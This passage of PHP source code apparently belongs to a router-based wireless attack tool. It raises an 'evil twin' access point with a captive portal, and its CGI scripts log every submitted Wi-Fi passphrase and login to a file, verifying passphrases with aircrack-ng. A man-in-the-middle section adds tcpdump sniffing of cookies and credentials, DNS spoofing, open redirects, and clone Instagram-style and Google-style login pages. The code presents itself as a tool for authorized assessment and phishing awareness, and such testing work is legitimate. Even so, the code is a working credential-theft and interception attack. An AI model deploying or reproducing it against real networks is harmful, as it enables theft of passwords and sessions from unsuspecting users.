                    . '--dhcp-range=10.0.0.50,10.0.0.150,255.255.255.0,12h '
                    . '--dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1 --dhcp-authoritative '
                    . '--address=/#/10.0.0.1 --dhcp-leasefile=' . $eLeases . ' '
                    . '--pid-file=' . $eDnsPid . ' >> ' . $eDnsLog . ' 2>&1; ' .
                'uhttpd -f -p 10.0.0.1:8080 -h ' . escapeshellarg($www) . ' -x /cgi-bin -I index.html -E /cgi-bin/portal >> ' . escapeshellarg($rt . '/uhttpd.log') . ' 2>&1 & echo $! > ' . escapeshellarg($rt . '/uhttpd.pid') . '; ' .
                'nft add table inet evilportal 2>/dev/null; ' .
                'nft add chain inet evilportal pre "{ type nat hook prerouting priority -100 ; }" 2>/dev/null; ' .
                'nft add rule inet evilportal pre iifname evtwin0 tcp dport 80 redirect to :8080 2>/dev/null; ' .
                'nft insert rule inet fw4 input iifname evtwin0 accept 2>/dev/null; ' .
                'true';
        }
        $script = $common . $mode;
        shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $script . ' ) >/dev/null 2>&1'));

        // Give hostapd a moment to come up, then confirm.
        usleep(800000);
        if (!$this->isEvilPortalRunning()) {
            $err = trim((string)@file_get_contents($rt . '/hostapd.log')) . "\n" . trim((string)@file_get_contents($rt . '/setup.err'));
            $this->teardownEvilPortal();
            return self::setError('Twin AP (hostapd) failed to start. ' . trim($err));
        }

        $state = [
            'running' => true,
            'bssid' => $bssid,
            'ssid' => $safeSsid,
            'channel' => $channel,
            'band' => $band,
            'phy' => $monitor['phy'],
            'radio' => $monitor['radio'],
            'iface' => 'evtwin0',
            'portalIp' => '10.0.0.1',
            'template' => $internet ? 'passthrough' : $template,
            'verify' => $hasVerify,
            'internet' => $internet,
            'uplinkDev' => $uplinkDev,
            'dnsLog' => $internet ? $rt . '/dns.log' : '',
            'pcap' => $internet ? $rt . '/cap.pcap' : '',
            'dnsmasqFragment' => $fragment,
            'startedAt' => gmdate('c'),
        ];
        $this->writeEvilPortalState($state);

        if ($internet) {
            $note = 'Internet-passthrough twin is live. Clients get real internet through the '
                . $uplinkDev . ' uplink while their DNS queries and transit traffic are logged. '
                . 'Open the Traffic view to watch per-client activity.';
        } elseif ($hasVerify) {
            $note = 'Captive twin AP is live. Submitted passphrases are verified offline against a captured handshake.';
        } else {
            $note = 'Captive twin AP is live. No captured handshake for this target, so passphrases are stored but NOT verified. Run a Capture on this target first to enable verification.';
        }

        return self::setSuccess([
            'running' => true,
            'state' => $state,
            'note' => $note,
        ]);
    }

    private function portalTemplateDefs()
    {
        // Neutral, non-brand-impersonating templates for authorized self-assessment.
        // Each declares the fields its form posts to /cgi-bin/submit.
        return [
            'wifi' => [
                'label' => 'Wi-Fi password',
                'description' => 'Asks for the network password (can verify offline against a captured handshake).',
                'fields' => ['password'],
            ],
            'router' => [
                'label' => 'Router admin login',
                'description' => 'Generic router administration sign-in (username + password).',
                'fields' => ['username', 'password'],
            ],
            'isp' => [
                'label' => 'Internet sign-in',
                'description' => 'Generic ISP / Wi-Fi account sign-in (email + password).',
                'fields' => ['email', 'password'],
            ],
            'custom' => [
                'label' => 'Custom HTML',
                'description' => 'Your own page. Must contain a <form method=post action=/cgi-bin/submit>.',
                'fields' => [],
            ],
        ];
    }

    private function writePortalAssets($www, $bssid, $ssid, $hasVerify, $template = 'wifi', $customHtml = '')
    {
        $defs = $this->portalTemplateDefs();
        if (!isset($defs[$template])) {
            $template = 'wifi';
        }
        // Offline handshake verify only makes sense for the Wi-Fi-password template.
        $verify = ($template === 'wifi' && $hasVerify);

        $ssidHtml = htmlspecialchars($ssid, ENT_QUOTES);
        $page = function ($body, $title) use ($ssidHtml) {
            $t = htmlspecialchars($title, ENT_QUOTES);
            return "<!doctype html><html><head><meta charset=utf-8>"
                . "<meta name=viewport content='width=device-width,initial-scale=1'>"
                . "<title>{$t}</title>"
                . "<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#f2f4f8;margin:0;padding:0}"
                . ".card{max-width:380px;margin:12vh auto;background:#fff;border-radius:12px;box-shadow:0 6px 24px rgba(0,0,0,.1);padding:28px}"
                . "h1{font-size:20px;margin:0 0 4px}p{color:#555;font-size:14px}"
                . "input{width:100%;box-sizing:border-box;padding:12px;margin:10px 0;border:1px solid #ccc;border-radius:8px;font-size:16px}"
                . "button{width:100%;padding:12px;border:0;border-radius:8px;background:#0b5ed7;color:#fff;font-size:16px;font-weight:600}"
                . ".m{color:#b00;font-size:14px;margin:8px 0}</style></head><body><div class=card>{$body}</div></body></html>";
        };

        // Appended to every success page: once creds are in, the client is flagged
        // "done" (see the CGI below). Bouncing to a captive-detection URL then makes
        // the OS probe return the expected success response, so the sign-in sheet
        // (iOS CNA / Android) auto-dismisses instead of hanging on the portal.
        $doneScript = "<script>setTimeout(function(){location.replace('/hotspot-detect.html');},1200);</script>";

        // Build the login form(s) per template.
        $userInput = "<input type=text name=username placeholder='Username' autofocus required>";
        $emailInput = "<input type=email name=email placeholder='Email' autofocus required>";
        $passInput = "<input type=password name=password placeholder='Password' required>";
        $wifiInput = "<input type=password name=password placeholder='Wi-Fi password' autofocus required minlength=8>";

        if ($template === 'custom' && trim($customHtml) !== '') {
            // The operator's own page, served verbatim (authorized lab use only).
            @file_put_contents($www . '/index.html', $customHtml);
            $successTitle = "{$ssidHtml}";
            @file_put_contents($www . '/success.html', $page("<h1>{$ssidHtml}</h1><p>Signed in. You may now use the connection.</p>{$doneScript}", $successTitle));
        } elseif ($template === 'router') {
            $form = "<h1>Router administration</h1><p>Sign in to manage your router settings.</p>"
                . "<form method=post action=/cgi-bin/submit>{$userInput}{$passInput}"
                . "<button type=submit>Sign in</button></form>";
            @file_put_contents($www . '/index.html', $page($form, 'Router administration'));
            @file_put_contents($www . '/success.html', $page("<h1>Router administration</h1><p>Signed in successfully. You may close this window.</p>{$doneScript}", 'Router administration'));
        } elseif ($template === 'isp') {
            $form = "<h1>Internet sign-in</h1><p>Sign in to continue to the internet.</p>"
                . "<form method=post action=/cgi-bin/submit>{$emailInput}{$passInput}"
                . "<button type=submit>Sign in</button></form>";
            @file_put_contents($www . '/index.html', $page($form, 'Internet sign-in'));
            @file_put_contents($www . '/success.html', $page("<h1>Internet sign-in</h1><p>You are now connected. You may close this window.</p>{$doneScript}", 'Internet sign-in'));
        } else {
            // wifi (default)
            $title = "{$ssidHtml} — Wi-Fi Login";
            $form = "<h1>{$ssidHtml}</h1><p>Your Wi-Fi session needs to be re-authenticated. Please enter the network password to reconnect.</p>"
                . "<form method=post action=/cgi-bin/submit>{$wifiInput}"
                . "<button type=submit>Connect</button></form>";
            @file_put_contents($www . '/index.html', $page($form, $title));

            $retryForm = "<h1>{$ssidHtml}</h1><p class=m>That password was incorrect. Please try again.</p>"
                . "<form method=post action=/cgi-bin/submit>{$wifiInput}"
                . "<button type=submit>Connect</button></form>";
            @file_put_contents($www . '/retry.html', $page($retryForm, $title));
            @file_put_contents($www . '/success.html', $page("<h1>{$ssidHtml}</h1><p>Connected. You may now use the internet.</p>{$doneScript}", $title));
        }

        // busybox-sh CGI: capture EVERY posted field (url-decoded, joined "k=v; k=v"),
        // still extract `password` for the optional offline handshake verify, then
        // serve success (or retry on a wrong Wi-Fi password when verifying).
        $verifyBlock = $verify
            ? "if [ -n \"\$pass\" ]; then printf '%s\\n' \"\$pass\" > \"\$RT/wl.txt\"; "
              . "if aircrack-ng -a2 -b \"\$BSSID\" -w \"\$RT/wl.txt\" \"\$RT/verify.cap\" 2>/dev/null | grep -q 'KEY FOUND'; then verified=yes; fi; fi\n"
            : "verified=unverified\n";

        // Flag the client "done" once we accept it (verified Wi-Fi password, or any
        // submit on a non-verifying template). The fallback CGI then answers the OS
        // captive probe with success so the sign-in sheet auto-closes.
        $markDone = "mkdir -p \"\$RT/done\" 2>/dev/null; : > \"\$RT/done/\${REMOTE_ADDR:-x}\" 2>/dev/null; ";
        $showResult = $verify
            ? "if [ \"\$verified\" = yes ]; then {$markDone}cat \"\$WWW/success.html\"; else cat \"\$WWW/retry.html\"; fi\n"
            : "{$markDone}cat \"\$WWW/success.html\"\n";

        // Per-field url-decode loop (pure shell; no PHP interpolation here).
        $decodeLogic = <<<'SH'
len="${CONTENT_LENGTH:-0}"
body=""
if [ "$len" -gt 0 ] 2>/dev/null; then body="$(head -c "$len")"; fi
fields="$(printf '%s\n' "$body" | tr '&' '\n' | while IFS= read -r kv || [ -n "$kv" ]; do [ -z "$kv" ] && continue; k="${kv%%=*}"; v="${kv#*=}"; v="$(printf '%b' "$(printf '%s' "$v" | sed 's/+/ /g; s/%/\\x/g')")"; printf '%s=%s; ' "$k" "$v"; done | tr -d '|' | tr '\n' ' ')"
raw="$(printf '%s' "$body" | tr '&' '\n' | sed -n 's/^password=//p' | head -n1)"
pass="$(printf '%b' "$(printf '%s' "$raw" | sed 's/+/ /g; s/%/\\x/g')")"
SH;

        $cgi = "#!/bin/sh\n"
            . "printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "RT=" . escapeshellarg($this->evilPortalDir()) . "\n"
            . "WWW=\"\$RT/www\"\n"
            . "BSSID=" . escapeshellarg($bssid) . "\n"
            . "TEMPLATE=" . escapeshellarg($template) . "\n"
            . $decodeLogic . "\n"
            . "verified=no\n"
            . $verifyBlock
            . "printf '%s | %s | %s | %s | %s\\n' \"\$(date '+%Y-%m-%d %H:%M:%S')\" \"\${REMOTE_ADDR:-?}\" \"\$TEMPLATE\" \"\$fields\" \"\$verified\" >> \"\$RT/creds.log\"\n"
            . $showResult;
        @file_put_contents($www . '/cgi-bin/submit', $cgi);
        @chmod($www . '/cgi-bin/submit', 0755);

        // Fallback handler (wired to uhttpd's -E). Every unknown path — which is
        // exactly what the OS captive-detection probes hit — lands here. Before a
        // client submits, it just gets the portal; after it is flagged "done", we
        // return the response each OS expects to declare itself online (Apple/most:
        // a "Success" body; Android generate_204: an empty 204), dismissing the sheet.
        $portalCgi = "#!/bin/sh\n"
            . "RT=" . escapeshellarg($this->evilPortalDir()) . "\n"
            . "WWW=\"\$RT/www\"\n"
            . "ip=\"\${REMOTE_ADDR:-x}\"\n"
            . "uri=\"\${REQUEST_URI:-}\"\n"
            . "if [ -f \"\$RT/done/\$ip\" ]; then\n"
            . "  case \"\$uri\" in\n"
            . "    *204*) printf 'Status: 204 No Content\\r\\nContent-Length: 0\\r\\n\\r\\n'; exit 0;;\n"
            . "  esac\n"
            . "  printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "  printf '%s' '<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>'\n"
            . "  exit 0\n"
            . "fi\n"
            . "printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "cat \"\$WWW/index.html\"\n";
        @file_put_contents($www . '/cgi-bin/portal', $portalCgi);
        @chmod($www . '/cgi-bin/portal', 0755);
    }

    private function readEvilPortalLeases()
    {
        // Passthrough leases come from the main dnsmasq (/tmp/dhcp.leases); captive
        // leases come from the twin's dedicated dnsmasq (twin.leases). Read both and
        // filter to the twin subnet, de-duping by MAC.
        $clients = [];
        $seen = [];
        $files = ['/tmp/dhcp.leases', '/var/dhcp.leases', $this->evilPortalDir() . '/twin.leases'];
        foreach ($files as $path) {
            foreach (explode("\n", (string)@file_get_contents($path)) as $line) {
                $parts = preg_split('/\s+/', trim($line));
                if (count($parts) >= 3 && $this->isSafeBssid(strtolower($parts[1])) && strpos($parts[2], '10.0.0.') === 0) {
                    $mac = strtolower($parts[1]);
                    if (isset($seen[$mac])) {
                        continue;
                    }
                    $seen[$mac] = true;
                    $clients[] = [
                        'mac' => $mac,
                        'ip' => $parts[2],
                        'hostname' => isset($parts[3]) && $parts[3] !== '*' ? $parts[3] : '',
                    ];
                }
            }
        }
        return $this->attachVendors($clients, 'mac');
    }

    private function readEvilPortalCreds()
    {
        $path = $this->evilPortalDir() . '/creds.log';
        $creds = [];
        foreach (explode("\n", (string)@file_get_contents($path)) as $line) {
            $line = trim($line);
            if ($line === '') {
                continue;
            }
            // New Portal-Kit rows: time | ip | template | fields | verified (5 cols).
            // Legacy Wi-Fi rows:    time | ip | password | verified            (4 cols).
            $parts = array_map('trim', explode('|', $line, 5));
            if (count($parts) === 5) {
                $fields = $parts[3];
                $password = '';
                if (preg_match('/(?:^|\s)password=([^;]*)/i', $fields, $pm)) {
                    $password = trim($pm[1]);
                }
                $creds[] = [
                    'time' => $parts[0],
                    'ip' => $parts[1],
                    'template' => $parts[2],
                    'fields' => $fields,
                    'password' => $password,
                    'verified' => $parts[4] === 'yes',
                    'status' => $parts[4],
                ];
            } elseif (count($parts) >= 4) {
                $creds[] = [
                    'time' => $parts[0],
                    'ip' => $parts[1],
                    'template' => 'wifi',
                    'fields' => 'password=' . $parts[2],
                    'password' => $parts[2],
                    'verified' => $parts[3] === 'yes',
                    'status' => $parts[3],
                ];
            }
        }
        return $creds;
    }

    private function firstVerifiedPassword($credentials)
    {
        foreach ($credentials as $cred) {
            if (!empty($cred['verified'])) {
                return $cred['password'];
            }
        }
        return '';
    }

    private function teardownEvilPortal()
    {
        // Tear down any MITM add-ons (sniffer, spoof resolver, spoof web server,
        // and the prerouting redirect chain) before removing the portal itself.
        $this->teardownMitm(true);
        $rt = $this->evilPortalDir();
        $kill = function ($pidFile) {
            if (is_file($pidFile)) {
                $pid = (int)trim((string)@file_get_contents($pidFile));
                if ($pid > 0) {
                    shell_exec('kill ' . (int)$pid . ' 2>/dev/null');
                }
            }
        };
        $kill($rt . '/hostapd.pid');
        $kill($rt . '/uhttpd.pid');
        $kill($rt . '/tcpdump.pid');
        $kill($rt . '/dnsmasq.pid');
        // Belt-and-suspenders for orphans (no pkill on this busybox). Patterns are
        // scoped to our runtime path so the system's global hostapd/dnsmasq are safe.
        shell_exec("kill $(/usr/bin/pgrep -f 'hostapd.*evilportal/hostapd.conf' 2>/dev/null) 2>/dev/null");
        shell_exec("kill $(/usr/bin/pgrep -f 'uhttpd.*evilportal/www' 2>/dev/null) 2>/dev/null");
        shell_exec("kill $(/usr/bin/pgrep -f 'tcpdump.*evilportal/cap.pcap' 2>/dev/null) 2>/dev/null");
        shell_exec("kill $(/usr/bin/pgrep -f 'dnsmasq.*evilportal/twin.leases' 2>/dev/null) 2>/dev/null");
        // fw4 reload flushes the forward/input accepts we inserted; deleting our own
        // nat table removes both the captive redirect and the passthrough masquerade.
        shell_exec('/usr/sbin/nft delete table inet evilportal 2>/dev/null');
        shell_exec('/sbin/fw4 reload >/dev/null 2>&1');
        shell_exec('iw dev evtwin0 del 2>/dev/null');

        // Remove the DHCP pool fragment and restore the box's dnsmasq.
        $state = $this->readEvilPortalState();
        $fragment = $state['dnsmasqFragment'] ?? '';
        if (is_string($fragment) && $fragment !== '' && is_file($fragment)) {
            @unlink($fragment);
            shell_exec('/etc/init.d/dnsmasq restart >/dev/null 2>&1');
        }

        $state['running'] = false;
        $state['stoppedAt'] = gmdate('c');
        $this->writeEvilPortalState($state);
    }

    // ===================================================================
    // MITM toolkit — runs ON TOP of a passthrough Evil Portal (where the twin
    // is the clients' gateway + resolver, so we already sit in the middle).
    //   * HTTP sniff: tcpdump on evtwin0 surfaces cleartext Host/Cookie (session
    //     hijack material) and form/Basic-auth credentials. HTTPS is opaque.
    //   * DNS spoof: a dedicated resolver on :5353 answers chosen domains with a
    //     redirect IP; an nft prerouting redirect scoped to evtwin0 sends ONLY the
    //     twin clients' DNS there (the real LAN is untouched), and their HTTP to
    //     10.0.0.1 is redirected to a local landing page.
    // ARP cache poisoning is intentionally NOT offered: no arp-spoofing tool ships
    // on this hardware, and it would be redundant — as the gateway we already have
    // the full MITM position ARP poisoning would try to obtain.
    // ===================================================================
    private function teardownMitm($removeState = true)
    {
        $rt = $this->evilPortalDir();
        $kill = function ($pidFile) use ($rt) {
            $path = $rt . '/' . $pidFile;
            if (is_file($path)) {
                $pid = (int)trim((string)@file_get_contents($path));
                if ($pid > 0) {
                    shell_exec('kill ' . (int)$pid . ' 2>/dev/null');
                }
                @unlink($path);
            }
        };
        $kill('httpsniff.pid');
        $kill('mitmdns.pid');
        $kill('spoofhttp.pid');
        shell_exec("kill $(/usr/bin/pgrep -f 'tcpdump.*evilportal/http.log' 2>/dev/null) 2>/dev/null");
        shell_exec("kill $(/usr/bin/pgrep -f 'dnsmasq.*evilportal/mitmdns.pid' 2>/dev/null) 2>/dev/null");
        shell_exec("kill $(/usr/bin/pgrep -f 'uhttpd.*evilportal/spoofwww' 2>/dev/null) 2>/dev/null");
        // Remove only our prerouting redirect chain — leaves the passthrough
        // masquerade (postrt chain in the same table) intact.
        shell_exec('/usr/sbin/nft flush chain inet evilportal predns 2>/dev/null');
        shell_exec('/usr/sbin/nft delete chain inet evilportal predns 2>/dev/null');
        if ($removeState) {
            @unlink($rt . '/mitm.json');
        }
    }

    // Clone templates for the MITM domain rules below: a spoofed domain can serve
    // one of these instead of the plain notice page. Kept as neutral, styled-text
    // wordmarks (not the real brand's assets) — enough to run a believable
    // credential-capture awareness demo without reproducing trademarked logos.
    private function mitmCloneTemplateDefs()
    {
        return [
            'instagram' => ['label' => 'Instagram-style login', 'description' => 'Username/email + password clone login page.'],
            'google' => ['label' => 'Google-style sign-in', 'description' => 'Email + password clone sign-in page.'],
        ];
    }

    private function mitmNoticePage($msg)
    {
        $m = htmlspecialchars($msg !== '' ? $msg : 'This site has been redirected as part of an authorized security assessment.', ENT_QUOTES);
        return "<!doctype html><html><head><meta charset=utf-8>"
            . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Notice</title>"
            . "<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;"
            . "display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}"
            . ".b{max-width:440px;padding:28px;text-align:center}h1{font-size:20px}p{color:#94a3b8;font-size:15px}</style>"
            . "</head><body><div class=b><h1>Security assessment</h1><p>{$m}</p></div></body></html>";
    }

    // Shown right after a clone-page submit, in place of the real destination —
    // the whole point of a clone rule is to demonstrate the risk immediately.
    private function mitmGotchaPage()
    {
        return "<!doctype html><html><head><meta charset=utf-8>"
            . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Security awareness test</title>"
            . "<style>body{font-family:-apple-system,Segoe UI,Roboto,sans-serif;background:#0f172a;color:#e2e8f0;"
            . "display:flex;min-height:100vh;align-items:center;justify-content:center;margin:0}"
            . ".b{max-width:460px;padding:32px;text-align:center}h1{color:#f87171;font-size:20px}p{color:#94a3b8;font-size:15px}</style>"
            . "</head><body><div class=b><h1>This was a simulated phishing test</h1>"
            . "<p>You just entered credentials into a fake login page as part of an authorized security assessment on this network. "
            . "If this had been a real attack, that account would now be compromised.</p>"
            . "<p>Check the address bar before signing in anywhere, and never reuse this password if it was real.</p></div></body></html>";
    }

    private function renderMitmClonePage($template)
    {
        if ($template === 'instagram') {
            return "<!doctype html><html><head><meta charset=utf-8>"
                . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Instagram</title>"
                . "<style>body{font-family:-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fafafa;margin:0}"
                . ".wrap{max-width:350px;margin:60px auto;padding:0 20px}"
                . ".card{background:#fff;border:1px solid #dbdbdb;border-radius:1px;padding:36px 40px 20px;text-align:center}"
                . ".logo{font-size:42px;margin:22px 0 30px;font-weight:600;font-style:italic;"
                . "background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);-webkit-background-clip:text;-webkit-text-fill-color:transparent}"
                . "input{width:100%;box-sizing:border-box;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;padding:9px 8px;margin:3px 0;font-size:14px}"
                . "button{width:100%;margin-top:10px;padding:9px;border:0;border-radius:8px;background:#4cb5f9;color:#fff;font-weight:600}"
                . ".sep{color:#8e8e8e;font-size:13px;margin:14px 0}"
                . ".foot{border:1px solid #dbdbdb;border-radius:1px;margin-top:12px;padding:18px;font-size:14px;text-align:center}</style>"
                . "</head><body><div class=wrap><div class=card><div class=logo>Instagram</div>"
                . "<form method=post action=/cgi-bin/submit>"
                . "<input type=text name=username placeholder='Phone number, username, or email' autofocus required>"
                . "<input type=password name=password placeholder='Password' required>"
                . "<button type=submit>Log in</button></form><div class=sep>Forgot password?</div></div>"
                . "<div class=foot>Don't have an account? <b>Sign up</b></div></div></body></html>";
        }
        if ($template === 'google') {
            return "<!doctype html><html><head><meta charset=utf-8>"
                . "<meta name=viewport content='width=device-width,initial-scale=1'><title>Sign in - Accounts</title>"
                . "<style>body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0}"
                . ".wrap{max-width:450px;margin:40px auto;padding:48px 40px;border:1px solid #dadce0;border-radius:8px;box-sizing:border-box}"
                . ".logo{font-size:24px;font-weight:400;margin-bottom:16px}.logo b{color:#4285F4}"
                . "h1{font-size:24px;font-weight:400;margin:8px 0}p{color:#5f6368;font-size:16px}"
                . "input{width:100%;box-sizing:border-box;border:1px solid #dadce0;border-radius:4px;padding:13px 15px;margin:8px 0;font-size:16px}"
                . "button{float:right;margin-top:20px;padding:10px 24px;border:0;border-radius:4px;background:#1a73e8;color:#fff;font-weight:600}</style>"
                . "</head><body><div class=wrap><div class=logo><b>G</b>oogle</div><h1>Sign in</h1><p>to continue</p>"
                . "<form method=post action=/cgi-bin/submit>"
                . "<input type=email name=email placeholder='Email or phone' autofocus required>"
                . "<input type=password name=password placeholder='Password' required>"
                . "<button type=submit>Next</button></form></div></body></html>";
        }
        return $this->mitmNoticePage('');
    }

    // Writes the MITM landing site: one dispatch CGI keyed by the Host header (so
    // one uhttpd instance serves every ruled domain differently), a per-domain
    // pre-rendered clone page for "clone" rules, and a submit handler that logs
    // captured fields into the same creds.log the captive portal uses (tagged
    // "mitm-<host>" so the two sources stay distinguishable in the UI).
    private function writeMitmAssets($rt, $rules, $noticeMsg)
    {
        $www = $rt . '/spoofwww';
        shell_exec('rm -rf ' . escapeshellarg($www) . ' 2>/dev/null');
        @mkdir($www . '/pages', 0755, true);
        @mkdir($www . '/cgi-bin', 0755, true);

        @file_put_contents($www . '/index.html', $this->mitmNoticePage($noticeMsg));
        @file_put_contents($www . '/gotcha.html', $this->mitmGotchaPage());

        $rulesLines = '';
        foreach ($rules as $r) {
            $domain = $r['domain'];
            if ($r['action'] === 'redirect') {
                $rulesLines .= $domain . '|redirect|' . $r['target'] . "\n";
            } elseif ($r['action'] === 'clone') {
                $safe = preg_replace('/[^a-z0-9.-]/', '_', $domain);
                @file_put_contents($www . '/pages/' . $safe . '.html', $this->renderMitmClonePage($r['template']));
                $rulesLines .= $domain . '|clone|' . $safe . "\n";
            }
            // 'notice' domains need no line; the CGI's default action is notice.
        }
        @file_put_contents($rt . '/mitmrules.txt', $rulesLines);

        $handleCgi = "#!/bin/sh\n"
            . "RT=" . escapeshellarg($rt) . "\n"
            . "WWW=\"\$RT/spoofwww\"\n"
            . "host=\"\${HTTP_HOST%%:*}\"\n"
            . "action=notice; param=\n"
            . "if [ -f \"\$RT/mitmrules.txt\" ]; then\n"
            . "  while IFS='|' read -r d a p; do\n"
            . "    if [ \"\$d\" = \"\$host\" ]; then action=\"\$a\"; param=\"\$p\"; break; fi\n"
            . "  done < \"\$RT/mitmrules.txt\"\n"
            . "fi\n"
            . "case \"\$action\" in\n"
            . "  redirect)\n"
            . "    printf 'Status: 302 Found\\r\\nLocation: %s\\r\\n\\r\\n' \"\$param\"\n"
            . "    ;;\n"
            . "  clone)\n"
            . "    printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "    cat \"\$WWW/pages/\$param.html\" 2>/dev/null || cat \"\$WWW/index.html\"\n"
            . "    ;;\n"
            . "  *)\n"
            . "    printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "    cat \"\$WWW/index.html\"\n"
            . "    ;;\n"
            . "esac\n";
        @file_put_contents($www . '/cgi-bin/handle', $handleCgi);
        @chmod($www . '/cgi-bin/handle', 0755);

        $submitCgi = "#!/bin/sh\n"
            . "RT=" . escapeshellarg($rt) . "\n"
            . "host=\"\${HTTP_HOST%%:*}\"\n"
            . "len=\"\${CONTENT_LENGTH:-0}\"\n"
            . "body=\"\"\n"
            . "if [ \"\$len\" -gt 0 ] 2>/dev/null; then body=\"\$(head -c \"\$len\")\"; fi\n"
            . "fields=\"\$(printf '%s\\n' \"\$body\" | tr '&' '\\n' | while IFS= read -r kv || [ -n \"\$kv\" ]; do [ -z \"\$kv\" ] && continue; k=\"\${kv%%=*}\"; v=\"\${kv#*=}\"; v=\"\$(printf '%b' \"\$(printf '%s' \"\$v\" | sed 's/+/ /g; s/%/\\\\x/g')\")\"; printf '%s=%s; ' \"\$k\" \"\$v\"; done | tr -d '|' | tr '\\n' ' ')\"\n"
            . "printf '%s | %s | mitm-%s | %s | n/a\\n' \"\$(date '+%Y-%m-%d %H:%M:%S')\" \"\${REMOTE_ADDR:-?}\" \"\$host\" \"\$fields\" >> \"\$RT/creds.log\"\n"
            . "printf 'Content-type: text/html\\r\\n\\r\\n'\n"
            . "cat \"\$RT/spoofwww/gotcha.html\"\n";
        @file_put_contents($www . '/cgi-bin/submit', $submitCgi);
        @chmod($www . '/cgi-bin/submit', 0755);
    }

    public function updateMitm()
    {
        $state = $this->readEvilPortalState();
        if (empty($state['running']) || empty($state['internet'])) {
            return self::setError('MITM tools need a running Evil Portal in Internet-passthrough mode — that is the gateway position the attacks operate from.');
        }
        if (empty($this->request['authorized'])) {
            return self::setError('Confirm this is your authorized lab network before enabling MITM.');
        }
        $rt = $this->evilPortalDir();
        $httpSniff = !empty($this->request['httpSniff']);
        $noticeMsg = substr((string)($this->request['landingText'] ?? ''), 0, 2000);

        // Sanitize the rules list: each rule spoofs one domain to the twin and
        // decides what twin clients see when they land on it — a plain awareness
        // notice, an open HTTP redirect to any URL ("send google.com anywhere"),
        // or a clone login page (credential-capture awareness demo). All three ride
        // the same DNS-spoof + local-uhttpd plumbing; only the served response differs.
        $cloneTemplates = array_keys($this->mitmCloneTemplateDefs());
        $rules = [];
        $rawRules = $this->request['rules'] ?? [];
        if (is_array($rawRules)) {
            foreach ($rawRules as $r) {
                if (!is_array($r)) {
                    continue;
                }
                $domain = strtolower(trim((string)($r['domain'] ?? '')));
                $domain = preg_replace('#^https?://#', '', $domain);
                $domain = preg_replace('#/.*$#', '', $domain);
                if ($domain === '' || strpos($domain, '.') === false || !preg_match('/^[a-z0-9.-]{1,120}$/', $domain)) {
                    continue;
                }
                $action = (string)($r['action'] ?? 'notice');
                if ($action === 'redirect') {
                    // http(s) URL only, no whitespace/control chars (blocks header injection
                    // into the Location response and javascript:/data: schemes).
                    $target = trim((string)($r['target'] ?? ''));
                    if (!preg_match('#^https?://[A-Za-z0-9.-]+(:\d{1,5})?(/\S*)?$#', $target) || strlen($target) > 500) {
                        continue;
                    }
                    $rules[$domain] = ['domain' => $domain, 'action' => 'redirect', 'target' => $target];
                } elseif ($action === 'clone') {
                    $tpl = (string)($r['template'] ?? '');
                    if (!in_array($tpl, $cloneTemplates, true)) {
                        continue;
                    }
                    $rules[$domain] = ['domain' => $domain, 'action' => 'clone', 'template' => $tpl];
                } else {
                    $rules[$domain] = ['domain' => $domain, 'action' => 'notice'];
                }
            }
        }
        $rules = array_slice(array_values($rules), 0, 40);
        $domains = array_column($rules, 'domain');

        // Re-apply cleanly (idempotent): remove prior bits, keep the config file.
        $this->teardownMitm(false);

        if ($httpSniff && trim((string)shell_exec('command -v tcpdump 2>/dev/null')) !== '') {
            @file_put_contents($rt . '/http.log', '');
            @chmod($rt . '/http.log', 0666);
            $cmd = 'tcpdump -i evtwin0 -l -A -n -s 0 -U ' . escapeshellarg('tcp port 80')
                . ' >> ' . escapeshellarg($rt . '/http.log') . ' 2>/dev/null & echo $! > ' . escapeshellarg($rt . '/httpsniff.pid');
            shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $cmd . ' ) >/dev/null 2>&1'));
        }

        if (!empty($rules)) {
            $this->writeMitmAssets($rt, $rules, $noticeMsg);
            $up = 'uhttpd -f -p 10.0.0.1:8081 -h ' . escapeshellarg($rt . '/spoofwww')
                . ' -x /cgi-bin -E /cgi-bin/handle >> ' . escapeshellarg($rt . '/spoofhttp.log') . ' 2>&1 & echo $! > ' . escapeshellarg($rt . '/spoofhttp.pid');
            shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $up . ' ) >/dev/null 2>&1'));

            // Dedicated spoofing resolver: every ruled domain -> us; everything else
            // forwarded to the twin's own passthrough resolver on 10.0.0.1:53 (which
            // does the real upstream lookup + query logging).
            $addr = '';
            foreach ($domains as $d) {
                $addr .= '--address=/' . $d . '/10.0.0.1 ';
            }
            $dns = 'dnsmasq --conf-file=/dev/null --no-hosts --no-resolv --bind-interfaces '
                . '--interface=evtwin0 --except-interface=lo --listen-address=10.0.0.1 --port=5353 '
                . '--server=10.0.0.1 ' . $addr
                . '--pid-file=' . escapeshellarg($rt . '/mitmdns.pid') . ' >> ' . escapeshellarg($rt . '/mitmdns.log') . ' 2>&1';
            shell_exec('/bin/sh -c ' . escapeshellarg('( ' . $dns . ' ) >/dev/null 2>&1'));

            // Scope the interception to twin clients only.
            shell_exec('/usr/sbin/nft add chain inet evilportal predns "{ type nat hook prerouting priority -100 ; }" 2>/dev/null');
            shell_exec('/usr/sbin/nft add rule inet evilportal predns iifname evtwin0 udp dport 53 redirect to :5353 2>/dev/null');
            shell_exec('/usr/sbin/nft add rule inet evilportal predns iifname evtwin0 tcp dport 53 redirect to :5353 2>/dev/null');
            shell_exec('/usr/sbin/nft add rule inet evilportal predns iifname evtwin0 ip daddr 10.0.0.1 tcp dport 80 redirect to :8081 2>/dev/null');
        }

        $mitm = [
